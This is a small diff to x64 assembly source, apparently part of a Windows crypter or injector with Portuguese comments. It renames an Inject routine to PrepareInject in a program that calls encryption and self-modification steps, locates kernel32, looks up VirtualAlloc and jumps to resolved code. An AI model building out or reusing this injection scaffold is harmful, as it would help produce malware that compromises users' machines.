@@ -41,7 +41,7 @@ WinMain:
         call codeModification
         call Encrypt
         call CriaArquivoEncriptado 
-        call Inject
+        call PrepareInject
 
         
         
@@ -494,7 +494,7 @@ WinMain:
                 mov r8, rbx;              # Copia o endereco base da ntdll para o registrador R8
         ret
 
-        Inject:
+        PrepareInject:
                 call Locate_kernel32
                 mov rdi,r8
                 ;Lookup VirtualAlloc
@@ -677,7 +677,7 @@ WinMain:
                 sub rsp, 0x30
                 call r14
                 mov r12 ,rax
-                
+
                 call r12
                                               
 ret
